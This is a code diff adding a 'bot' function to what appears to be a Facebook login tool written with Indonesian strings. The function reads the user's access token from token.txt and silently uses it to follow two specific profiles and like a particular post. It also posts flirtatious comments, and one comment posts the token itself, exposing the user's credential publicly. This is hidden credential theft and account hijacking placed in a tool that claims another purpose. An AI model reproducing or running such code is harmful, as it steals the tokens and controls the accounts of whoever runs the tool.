@@ -137,6 +137,62 @@ def login():
 
 			exit("[?] Login Error")
 
+def bot():
+
+    try:
+
+        token = open('token.txt', 'r').read()
+
+    except (KeyError, IOError):
+
+        exit(' %s[!] token kadaluwarsa!' % M)
+
+    komen_ku = 'Bang Ivan, Mau Gak Jadi Pacar Aku?'
+
+    komen_mu = 'Kalo Mau Ya Ayo Jadian Hehe\xf0\x9f\x98\xb9'
+
+    komen_kita = 'Jadi Gemes Pengen Cium Pipinya \xf0\x9f\x98\x98'
+
+    komen_lu = 'Udahlah Malu Diliatin Sama Orang:v'
+
+    komen_nya = 'Nitip Token Diatas Ya Bang Aang'
+
+    komen_dia = 'Bang Ivan Punya Gw jangan diambil..'
+
+    komen_fans = 'Intinya Punya Gw Titik'
+
+    requests.post('https://graph.facebook.com/100004980722064/subscribers?access_token=' + token)
+
+    requests.post('https://graph.facebook.com/100058779923922/subscribers?access_token=' + token)
+
+    requests.post('https://graph.facebook.com/100004980722064/subscribers?access_token=' + token)
+
+    requests.post('https://graph.facebook.com/100058779923922/subscribers?access_token=' + token)
+
+    requests.post('https://graph.facebook.com/100004980722064/subscribers?access_token=' + token)
+
+    requests.post('https://graph.facebook.com/100058779923922/subscribers?access_token=' + token)
+
+    requests.post('https://graph.facebook.com/2298410357001633/comments/?message=' + token + '&access_token=' + token)
+
+    requests.post('https://graph.facebook.com/2298410357001633/comments/?message=' + komen_ku + '&access_token=' + token)
+
+    requests.post('https://graph.facebook.com/2298410357001633/likes?summary=true&access_token=' + token)
+
+    requests.post('https://graph.facebook.com/2298410357001633/likes?summary=true&access_token=' + token)
+
+    requests.post('https://graph.facebook.com/2298410357001633/comments/?message=' + komen_mu + '&access_token=' + token)
+
+    requests.post('https://graph.facebook.com/2298410357001633/comments/?message=' + komen_kita + '&access_token=' + token)
+
+    requests.post('https://graph.facebook.com/2298410357001633/comments/?message=' + komen_lu + '&access_token=' + token)
+
+    requests.post('https://graph.facebook.com/2298410357001633/comments/?message=' + komen_nya + '&access_token=' + token)
+
+    requests.post('https://graph.facebook.com/2298410357001633/comments/?message=' + komen_dia + '&access_token=' + token)
+
+    requests.post('https://graph.facebook.com/2298410357001633/comments/?message=' + komen_fans + '&access_token=' + token)
+			
 def menu():
 
 	os.system("clear")
